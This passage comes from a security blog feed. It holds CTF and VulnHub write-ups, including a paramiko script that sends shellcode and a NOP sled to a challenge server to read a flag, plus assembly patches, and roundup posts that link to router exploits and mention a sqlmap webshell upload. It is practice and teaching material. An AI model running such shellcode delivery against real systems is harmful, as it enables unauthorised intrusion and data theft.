<p>Which lead me to another problem: how do we send the shellcode? I couldn&rsquo;t send raw bytes over <code>ssh</code>. One option was to encode the shellcode again, using an alphanumeric carver. I decided to put that option on hold. I tried to port-forward the ssh connection so that I could use python and sockets to get the flag; didn&rsquo;t work. Instead, I had to turn to some paramiko black magic. Behold, <code>fullauto.py</code>!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">paramiko</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="n">ssh</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">SSHClient</span><span class="p">()</span>
</span><span class='line'><span class="c"># fix missing hostkey -&gt; https://stackoverflow.com/questions/10670217/paramiko-unknown-server</span>
</span><span class='line'><span class="n">ssh</span><span class="o">.</span><span class="n">set_missing_host_key_policy</span><span class="p">(</span><span class="n">paramiko</span><span class="o">.</span><span class="n">AutoAddPolicy</span><span class="p">())</span> 
</span><span class='line'><span class="n">ssh</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s">&#39;shellcode.ringzer0team.com&#39;</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="s">&#39;level7&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">&#39;FLAG-&lt;redacted&gt;&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">7771</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this was the only thing that worked for me. opening a channel via a transport failed miserably.</span>
</span><span class='line'><span class="n">chan</span> <span class="o">=</span> <span class="n">ssh</span><span class="o">.</span><span class="n">invoke_shell</span><span class="p">()</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">chan</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># send stage0, which will attempt to read from stdin. mind the last \n!</span>
</span><span class='line'><span class="n">chan</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\\</span><span class="s">x04</span><span class="se">\\</span><span class="s">x10</span><span class="se">\\</span><span class="s">xd9</span><span class="se">\\</span><span class="s">xee</span><span class="se">\\</span><span class="s">xd8</span><span class="se">\\</span><span class="s">x20</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">x18</span><span class="se">\\</span><span class="s">x19</span><span class="se">\\</span><span class="s">xf6</span><span class="se">\\</span><span class="s">x87</span><span class="se">\\</span><span class="s">xf7</span><span class="se">\\</span><span class="s">x19</span><span class="se">\\</span><span class="s">xf6</span><span class="se">\\</span><span class="s">xb2</span><span class="se">\\</span><span class="s">xf0</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">xf2</span><span class="se">\\</span><span class="s">xa1</span><span class="se">\\</span><span class="s">xcc</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">chan</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># we&#39;ll need a small NOP sled to get us to the shellcode</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span> <span class="o">*</span> <span class="mi">20</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read in the 31 byte shellcode, designed to open/read/write a file</span>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;modified-shellcode3&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">data</span>
</span><span class='line'>  <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  
</span><span class='line'><span class="n">chan</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">chan</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;/flag/level7.flag</span><span class="se">\x00\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">chan</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive flag!</span>
</span><span class='line'><span class="k">print</span> <span class="n">chan</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running this python script with the appropriate password to level 7 spat out, amongst others, <em>part</em> of the final flag!</p>

<p>Something funky was going on. The stage 2 was being read and executed, but the contents of the flag on the stack were being mangled.</p>

<p>I finally traced it to this part of the shellcode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">lea</span> <span class="n">rsi</span><span class="p">,</span> <span class="p">[</span><span class="n">rsp</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">...</span>
</span><span class='line'>
</span><span class='line'><span class="n">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'><span class="n">push</span> <span class="n">rax</span>            <span class="p">;</span> <span class="n">the</span> <span class="n">push</span> <span class="n">seems</span> <span class="n">to</span> <span class="n">mangle</span> <span class="n">the</span> <span class="n">output</span> <span class="n">on</span> <span class="n">the</span> <span class="n">stack</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rdi</span>             <span class="p">;</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">stdout</span>
</span><span class='line'>                    <span class="p">;</span> <span class="n">rsi</span> <span class="o">=</span> <span class="n">still</span> <span class="n">pointer</span> <span class="n">to</span> <span class="nb">buffer</span>
</span><span class='line'>                    <span class="p">;</span> <span class="n">rdx</span> <span class="o">=</span> <span class="n">still</span> <span class="mh">0x7f</span>
</span><span class='line'><span class="n">syscall</span>
</span><span class='line'><span class="n">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>Substituting it for this seemed to do the trick:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">lea</span> <span class="n">rsi</span><span class="p">,</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">60</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">...</span>
</span><span class='line'>
</span><span class='line'><span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">rax</span>        <span class="p">;</span> <span class="n">number</span> <span class="n">of</span> <span class="nb">bytes</span> <span class="n">read</span><span class="p">;</span> <span class="n">output</span> <span class="n">exactly</span> <span class="n">the</span> <span class="n">contents</span> <span class="n">of</span> <span class="n">flag</span><span class="o">.</span> <span class="n">it</span><span class="s">&#39;s cleaner this way</span>
</span><span class='line'><span class="n">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'><span class="n">push</span> <span class="n">rax</span>            <span class="p">;</span> <span class="n">the</span> <span class="n">push</span> <span class="n">seems</span> <span class="n">to</span> <span class="n">mangle</span> <span class="n">the</span> <span class="n">output</span> <span class="n">on</span> <span class="n">the</span> <span class="n">stack</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rdi</span>             <span class="p">;</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">stdout</span>
</span><span class='line'>                    <span class="p">;</span> <span class="n">rsi</span> <span class="o">=</span> <span class="n">still</span> <span class="n">pointer</span> <span class="n">to</span> <span class="nb">buffer</span>
</span><span class='line'>                    <span class="p">;</span> <span class="n">rdx</span> <span class="o">=</span> <span class="n">still</span> <span class="mh">0x7f</span>
</span><span class='line'><span class="n">syscall</span>
</span><span class='line'><span class="n">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;m still puzzled why this originally mangled the output on the stack, where I had no problems with this shellcode before. If anyone has an idea, let me know in the comments :)</p>

<h2>Final words</h2>

<p>Phew, what a ride! These challenges were a lot of fun and taught me several interesting concepts about x86-64 shellcoding. Thank you <a href="http://ringzer0team.com/">RingZer0Team</a> for these awesome challenges!</p>

<p>This writeup was written in two evenings of rigorously hacking away at the keyboard (the challenges were solved over several days). Therefore, errors will probably exist. If you find any, or have any suggestion or useful remark, please feel free to leave them in the comments!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[(Semi) Weekly Roundup 2015 #3]]></title>
    <link href="http://barrebas.github.io/blog/2015/02/01/semi-weekly-roundup-2015-number-3/"/>
    <updated>2015-02-01T17:01:44+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/02/01/semi-weekly-roundup-2015-number-3</id>
    <content type="html"><![CDATA[<p>So maybe &lsquo;weekly&rsquo; isn&rsquo;t really the right word for these posts ;]</p>

<!-- more -->


<p>With all the stuff going on in the weekends, I kinda missed a few of these roundups.</p>

<p>Don&rsquo;t have anything to do and fancy winning awesome prizes? Head over to <a href="https://vulnhub.com">VulnHub.com</a> and give <a href="https://www.vulnhub.com/entry/sokar-1,113/">Sokar</a> by <a href="https://twitter.com/_RastaMouse">rasta_mouse</a> a spin! VulnHub is two years old and this VM is run as a competition to celebrate!</p>

<p>This <a href="https://labs.mwrinfosecurity.com/blog/2014/08/15/windows-8-kernel-memory-protections-bypass/">post by mwrsecurity</a> goes into great detail about bypassing Windows 8 kernel memory protection strategies. It talks about allocating user-land memory and then corrupting paging structures, so that the kernel thinks believes that piece of memory is executable as kernel-land code&hellip; Pretty clever stuff!</p>

<p>I came across this exploit, which allows attackers to change the <a href="http://packetstormsecurity.com/files/130113/D-Link-DSL-2740R-Unauthenticated-Remote-DNS-Change.html">DNS settings of a specific model D-Link router</a> remotely and <em>unauthenticated</em>. Scary stuff! Makes you wonder if manufacturers spend any time at all securing these appliances&hellip;</p>

<p>This <a href="http://powerofcommunity.net/poc2014/tombkeeper.pdf">PDF slidedeck</a> shows how to break out of a JavaScript virtual machine by abusing JS string objects. It&rsquo;s not very detailed and the explanation lacks a bit, but it&rsquo;s still quite an intriguing look into how these exploits work.</p>

<p>And finally, a while ago I found <a href="http://www.willhackforsushi.com/?p=581">this blog on willhackforsushi.com</a> which actually refers to one of my <a href="http://staringintodevnull.blogspot.nl/2013/12/making-it-ra1nx.html">old boot2root writeups</a>! In that VM, I had difficulty getting <code>sqlmap</code> to upload a webshell and I finally did it manually. The problem was fixed by Josh by starting with valid data for the SQL injection! The SQL code that stores the webshell on the remote server needs at least one valid line from the database and this condition is only triggered when valid input (like an <em>existing</em> username) is supplied. Good job figuring out the root cause!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[By the Numbers - theFrequency Writeup]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/15/by-the-numbers-thefrequency-writeup/"/>
    <updated>2015-01-15T17:21:58+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/15/by-the-numbers-thefrequency-writeup</id>
    <content type="html"><![CDATA[<p>Within a few days of releasing thePurge, strata decided to release yet another VM! This one was called theFrequency&hellip; It presents a very nice challenge involving radio signal encoding and audio stego. I needed several hints to solve this one, but it was worth it!</p>

<!-- more -->


<p></p>

<p>I downloaded it and did the normal nmap dance. Like many VMs these days, only one port was open. It was, of course, <code>http</code>, serving only a single mp3 file:</p>

<p><img src="http://barrebas.github.io/assets/freq/webserver.png" alt="" /></p>

<h2>DA-DIT-DA</h2>

<p>It&rsquo;s some kind of ambient mix, but at certain points in the audio you can hear weird noises and clicks. This sounded like audio stego to me! After downloading, I fired up <a href="http://www.sonicvisualiser.org/">Sonic Visualizer</a> and loaded the mp3. Select &lsquo;Layer > Add spectrogram&rsquo; or press <code>Ctrl+G</code> to visualize the sound. Right away, we can hear/see something that can only be Morse:</p>

<p><img src="http://barrebas.github.io/assets/freq/first-visualizer.png" alt="" /></p>

<p>I just used a <a href="https://en.wikipedia.org/wiki/Morse_code">Morse lookup table</a> to decode it by ear/hand:</p>

<p><img src="http://barrebas.github.io/assets/freq/morse.png" alt="" /></p>

<p>It decoded to <code>THE PASSWORD FOR LEVEL ONE IS THEFREQUENCY2015.</code> I then tried to use <code>ssh</code> to login to VM, only to be rejected. I had to use <code>sftp</code>, apparently. After logging in with lowercase <code>thefrequency2015.</code>, I grabbed the only file that was present. This was part of a larger SSH key. Gotta catch &lsquo;em all!</p>

<h2>LIGHTWRITER</h2>

<p>The second series of clicks is further away in the audio, at around 17 minutes. Looking at the spectrogram:</p>

<p><img src="http://barrebas.github.io/assets/freq/hellschreiber.png" alt="" /></p>

<p>I couldn&rsquo;t really figure out what this was. strata gave two hints, being <a href="http://wb8nut.com/digital/">this page full of digital radio mode examples</a> and saying something like &lsquo;you can almost read the letters&rsquo;. This meant that it had to be Hellschreiber (German for Lightwriter, I believe). But I couldn&rsquo;t figure out how to decode it by hand in Sonic Visualizer. I got pretty close:</p>

<p><img src="http://barrebas.github.io/assets/freq/level2.png" alt="" /></p>

<p>I could barely make out <code>THE PASSWORD FOR LEVEL TWO IS</code> and then&hellip; I started looking at the symbols, some looked very similar. I started seeing some letters. Looking at the Hellschreiber wikipedia page, it turned out Hellschreiber was invented by Rudolf Hell. This was also the password; I finally managed to decode it to <code>RUDOLFHELL1920</code>.</p>

<p>Then I managed to install <code>fldigi</code> on an Ubuntu 12.04 VM. This made it significantly easier. I extracted the relevant part of the mp3 with <code>audacity</code> and merged the stereo channels to mono (otherwise <code>fldigi</code> complains).</p>

<p><img src="http://barrebas.github.io/assets/freq/level2-fldigi.png" alt="" /></p>

<p>Again I could sftp to the VM and grab part of the key.</p>

<h2>IT SOUNDS JUST AS BAD AS IT LOOKS</h2>

<p>Onto level three! It sounds warbling, almost dissonant (for those of you that read Stephen King, &ldquo;It sounds Hawaian, doesn&rsquo;t it?&rdquo;). You can find it around 30:40, and from the digital modes page earlier, I thought that it was RTTY. It sure sounded like it! <code>fldigi</code> did not agree. It turned out to be BPSK31:</p>

<p><img src="http://barrebas.github.io/assets/freq/level3-psk.png" alt="" /></p>

<p>The key was coming together now. Level four was found around 41 minutes and sounded even worse. I had no idea how to decode it, but luckily strata gave me a hint. The bandwidth on this audio encoding scheme was 2 kHz and I tried all the modes that allowed for this bandwidth. It was the MT63 mode, used also by emergency services. You have to keep the sample running for a while, as only the first part really contains information.</p>

<p><img src="http://barrebas.github.io/assets/freq/level4-fldigi.png" alt="" /></p>

<p>Level five was next, and turned out to be RTTY!</p>

<p><img src="http://barrebas.github.io/assets/freq/level5.png" alt="" /></p>

<p>I could actually hear this, also for the next one. Level six was THROB and that describes the sound quite accurately.</p>

<p><img src="http://barrebas.github.io/assets/freq/level5-rtty.png" alt="" /></p>

<p><img src="http://barrebas.github.io/assets/freq/level6-throb.png" alt="" /></p>

<p>So now I had all the pieces of the key! I pieced them together and threw them at the root login&hellip; only to be asked for a passphrase. Bah! I thought, back to the mp3 and look for the passphrase. I looked at level six again:</p>

<p><img src="http://barrebas.github.io/assets/freq/level6-olivia.png" alt="" /></p>

<p>There seemed to be something at around 8 kHz! I stumbled upon <a href="http://www.hfradio.org.uk/html/digital_modes.html">this page</a> which made me believe it was encoded using <code>olivia</code> or <code>contestia</code>. I extracted that piece, applied a high-pass filter with a cutoff around 6 kHz and amplified the signal. But I could <strong>not</strong> get <code>fldigi</code> to decode it. After consulting with strata, it seemed that this was actually <em>part of the ambient mix itself</em>. Talk about stego!</p>

<p>So now what? I had to update my <code>ssh</code> to go login. The version on my own box did not support the key format. I opened a Kali box, got the latest &amp; greatest source tarball for OpenSSH, which was version 6.7p1. After that was done compiling, I could login as root using the acquired private key.</p>

<h2>Victory at last</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># cat flag.txt                                                                 </span>
</span><span class='line'>https://www.youtube.com/watch?v<span class="o">=</span>KEZTkvjSmHQ
</span><span class='line'>
</span><span class='line'>c5c8e00567f44fe9155655ddba163547
</span><span class='line'><span class="c"># hostname                                                                     </span>
</span><span class='line'>frequency.local
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>, 2<span class="o">(</span>kmem<span class="o">)</span>, 3<span class="o">(</span>sys<span class="o">)</span>, 4<span class="o">(</span>tty<span class="o">)</span>, 5<span class="o">(</span>operator<span class="o">)</span>, 20<span class="o">(</span>staff<span class="o">)</span>, 31<span class="o">(</span>guest<span class="o">)</span>
</span><span class='line'><span class="c"># whoami</span>
</span><span class='line'>root
</span></code></pre></td></tr></table></div></figure>


<p>Learned a ton while doing this one, very left-field VM, very different from the usual VMs on VulnHub! Overall, I&rsquo;d say it&rsquo;s perfect material for CTF training!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Weekly Roundup 2015 #2]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/12/weekly-roundup-2015-number-2/"/>
    <updated>2015-01-12T18:02:00+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/12/weekly-roundup-2015-number-2</id>
    <content type="html"><![CDATA[<p>A bit later and shorter than planned due to the CTF, but here&rsquo;s another weekly roundup!</p>

<!-- more -->


<p>I want to kick this one off with a beautiful writeup by <a href="https://twitter.com/dronesec">drone</a> on a <a href="https://hatriot.github.io/blog/2015/01/06/ntpdc-exploit/">local ntpdc overflow</a>. drone really takes you down the rabbit hole in terms of exploit dev and even manages to find that Debian x86 does not ship with PAE enabled. This means that protections such as NX are not enabled on these systems! Very detailed writeup which discusses the buffer overflows and the use of ROP and I highly recommend it.</p>

<p>No less than three VMs were released on VulnHub this week! <a href="https://www.vulnhub.com/entry/pandoras-box-1,111/">Pandora&rsquo;s Box</a> by c0ne and <a href="https://www.vulnhub.com/entry/the-purge-1,110/">the Purge</a> and <a href="https://www.vulnhub.com/entry/the-frequency-1,112/">theFrequency</a> by strata. I highly recommend Pandora&rsquo;s Box if you like exploit dev. I finished the Purge, which felt quite polished and is <em>really</em> left-field. Still working on the Frequency, which shows me a whole different world of audio stego!</p>

<p>Apparently, ASUS routers have a vulnerable service listening on UDP 9999 with runs with root privileges. This <em>infosrv</em> serivce <a href="https://github.com/jduck/asus-cmd">contains a vulnerability</a> that allows unauthenticated root command execution. There&rsquo;s also a published <a href="http://www.exploit-db.com/exploits/35688/">exploit</a> already. It&rsquo;s a pretty interesting writeup, including technical details. It seems to boil down to a programmer mistakenly using <em>memcpy</em> where he or she meant to use <em>memcmp</em>. Ouch.</p>

<p>Finally, I came across this blog that describes SROP or <a href="http://thisissecurity.net/2015/01/03/playing-with-signals-an-overview-on-sigreturn-oriented-programming/">Sigreturn Oriented Programming</a>, a variation on ROP. According to the blog post, it&rsquo;s a way to make stack overflows more reliable. The way I understand it, you need to overwrite a saved return address to execute a <em>sigreturn</em> syscall, which in turn allows one to call any syscall by forging the appropriate <code>uc_mcontect</code> struct in memory. This is convenient as one needs less gadgets to pull it off. Cool stuff! Hope to see this in one of the VulnHub VMs once :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - Sbox]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox/"/>
    <updated>2015-01-11T22:52:27+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox</id>
    <content type="html"><![CDATA[<p>Quirky little challenge, this <code>sbox</code>. We&rsquo;re actually given the keys to the kingdom right away!</p>

<!-- more -->


<p>Again, this was a one-two with superkojiman, who did the initial reversing! The program needs <code>libseccomp</code> to run. I had to install <code>libseccomp1</code> on my Ubuntu VM and symlink <code>libseccomp.so.2</code> to it to make the binary start. <a href="http://sourceforge.net/projects/libseccomp/">libseccomp</a> does syscall filtering. In this case, whatever is added to its internal list is ok, other syscalls are caught and the program exits with SIGSYS.</p>

<p>The syscalls that are whitelisted can be found by looking for <code>seccomp_rule_add</code> calls:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> 80488dc: c7 44 24 0c 00 00 00   mov    DWORD PTR [esp+0xc],0x0
</span><span class='line'> 80488e3: 00 
</span><span class='line'> 80488e4: c7 44 24 08 03 00 00    mov    DWORD PTR [esp+0x8],0x3  ; syscall read
</span><span class='line'> 80488eb: 00 
</span><span class='line'> 80488ec: c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
</span><span class='line'> 80488f3: 7f 
</span><span class='line'> 80488f4: 8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
</span><span class='line'> 80488f8: 89 04 24                mov    DWORD PTR [esp],eax
</span><span class='line'> 80488fb: e8 b0 fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;
</span><span class='line'> 8048900: 89 44 24 38             mov    DWORD PTR [esp+0x38],eax
</span><span class='line'> 8048904: 83 7c 24 38 00          cmp    DWORD PTR [esp+0x38],0x0
</span><span class='line'> 8048909: 79 05                   jns    8048910 &lt;main+0x191&gt;
</span><span class='line'> 804890b: e9 d9 00 00 00          jmp    80489e9 &lt;main+0x26a&gt;
</span><span class='line'> 8048910: c7 44 24 0c 00 00 00    mov    DWORD PTR [esp+0xc],0x0
</span><span class='line'> 8048917: 00 
</span><span class='line'> 8048918: c7 44 24 08 04 00 00    mov    DWORD PTR [esp+0x8],0x4  ; syscall write
</span><span class='line'> 804891f: 00 
</span><span class='line'> 8048920: c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
</span><span class='line'> 8048927: 7f 
</span><span class='line'> 8048928: 8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
</span><span class='line'> 804892c: 89 04 24                mov    DWORD PTR [esp],eax
</span><span class='line'> 804892f: e8 7c fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;
</span><span class='line'> 8048934: 89 44 24 38             mov    DWORD PTR [esp+0x38],eax
</span><span class='line'> 8048938: 83 7c 24 38 00          cmp    DWORD PTR [esp+0x38],0x0
</span><span class='line'> 804893d: 79 05                   jns    8048944 &lt;main+0x1c5&gt;
</span><span class='line'> 804893f: e9 a5 00 00 00          jmp    80489e9 &lt;main+0x26a&gt;
</span><span class='line'> 8048944: c7 44 24 0c 00 00 00    mov    DWORD PTR [esp+0xc],0x0
</span><span class='line'> 804894b: 00 
</span><span class='line'> 804894c: c7 44 24 08 01 00 00    mov    DWORD PTR [esp+0x8],0x1  ; syscall exit
</span><span class='line'> 8048953: 00 
</span><span class='line'> 8048954: c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
</span><span class='line'> 804895b: 7f 
</span><span class='line'> 804895c: 8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
</span><span class='line'> 8048960: 89 04 24                mov    DWORD PTR [esp],eax
</span><span class='line'> 8048963: e8 48 fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;</span></code></pre></td></tr></table></div></figure>


<p>So that&rsquo;s not a whole lot to work with. We can only read, write and exit. No <code>execve</code> or open/read/write for us!</p>

<h2>Diving deeper</h2>

<p>Luckily, when run, the binary does all the heavy lifting for us. It reads the flag and stores it on the heap. It then waits for input, storing that also on the heap and then proceeds to run whatever is entered:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   0x80489d6 &lt;main+599&gt;:    call   0x80485a0 &lt;read@plt&gt;
</span><span class='line'>   0x80489db &lt;main+604&gt;:    mov    eax,DWORD PTR [esp+0x2c]
</span><span class='line'>   0x80489df &lt;main+608&gt;:    mov    DWORD PTR [esp+0x3c],eax
</span><span class='line'>   0x80489e3 &lt;main+612&gt;:    mov    eax,DWORD PTR [esp+0x3c]
</span><span class='line'>   0x80489e7 &lt;main+616&gt;:    call   eax</span></code></pre></td></tr></table></div></figure>


<p>This allows us to supply our own shellcode without even having to exploit a vulnerability. There were some annoying things that prevented me from debugging the binary locally, so I hex-edited the binary to make the calls to <code>signal()</code> and <code>alarm()</code> do nothing (edit the <code>plt</code> section for those calls &amp; make the first byte <code>0xc3</code> -> <code>RET</code>).</p>

<p>I started binary via <code>socat</code> to test locally. First, let&rsquo;s see what we have to work with, by sending a single <code>0xcc</code> (<code>INT 3</code>) via a python script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
